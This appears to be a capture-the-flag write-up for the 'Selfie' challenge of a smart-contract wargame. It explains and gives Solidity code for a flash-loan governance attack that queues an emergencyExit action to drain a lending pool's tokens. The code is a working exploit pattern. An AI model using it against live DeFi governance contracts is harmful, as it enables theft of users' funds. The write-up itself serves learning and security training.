## Selfie solution

There are 1.5 million tokens in pool which we need to take. The governance mechanism is used by the same tokens, so it is easy to manipulate it. First, we need to take out a flashloan. During it, we execute `queueAction` with `data` parameter that has a signature of `emergencyExit` function. We repay the flashloan and wait for 2 day delay to execute our action. After 2 days, we call the `executeAction` with our actionId. Since in that case msg.sender is `SimpleGovernance`, we bypass the `onlyGovernance` modifier on `emergencyExit`, succesfully getting the tokens.

```
    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(attacker)
        );
        pool.flashLoan(
            this,
            address(govToken),
            govToken.balanceOf(address(pool)),
            data
        );
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        gov.queueAction(address(pool), 0, data);
        DamnValuableTokenSnapshot(token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
```